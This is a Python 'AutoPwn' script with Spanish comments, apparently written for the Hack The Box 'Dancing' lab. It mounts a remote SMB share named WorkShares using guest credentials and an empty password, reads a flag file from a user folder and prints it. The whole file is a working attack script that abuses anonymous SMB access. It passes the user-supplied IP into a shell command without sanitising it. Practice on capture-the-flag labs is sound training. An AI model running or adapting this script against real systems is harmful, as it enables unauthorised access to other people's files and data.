#!/usr/bin/python3

import os
import subprocess
import argparse
from colorama import Fore, Style

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self):
        mount_path = '/home/axel/HTB/dancing/exploits/mnt'
        share_path = f'//{self.ip_address}/WorkShares'
        username = 'guest'
        password = ''
        filename = 'flag.txt'

        # Verifica si la carpeta de montaje existe. Si no existe, la crea.
        if not os.path.exists(mount_path):
            try:
                os.makedirs(mount_path)
            except OSError as e:
                print(Fore.RED + f'No se pudo crear la carpeta: {str(e)}' + Style.RESET_ALL)

        # Comando para montar la carpeta compartida utilizando la dirección IP proporcionada y las credenciales de 'guest'
        mount_command = f"mount -t cifs {share_path} {mount_path} -o username={username},password={password}"
        subprocess.run(mount_command, shell=True, input=b'\n', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        file_path = os.path.join(mount_path, 'James.P', filename)

        try:
            # Intenta abrir el archivo 'flag.txt' y leer su contenido
            with open(file_path, 'r') as file:
                content = file.read()
                print(Fore.GREEN + f"El contenido de la 'flag': {content}" + Style.RESET_ALL)
        except FileNotFoundError:
            # Si el archivo no existe, muestra un mensaje de error
            print(Fore.RED + f'El archivo {file_path} no existe.' + Style.RESET_ALL)
        except PermissionError:
            # Si no se tienen permisos para leer el archivo, muestra un mensaje de error
            print(Fore.RED + f'No tienes permisos para leer el archivo {file_path}.' + Style.RESET_ALL)

        # Comando para desmontar la carpeta compartida
        umount_command = f'umount {mount_path}'
        subprocess.run(umount_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_arguments():
    # Función para obtener los argumentos de línea de comandos: dirección IP y puerto
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', default=445, dest='lport', required=False, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    # Función principal
    args = get_arguments()
    exploit = Exploit(args.ip_address, args.lport)
    exploit.run()

if __name__ == '__main__':
    main()

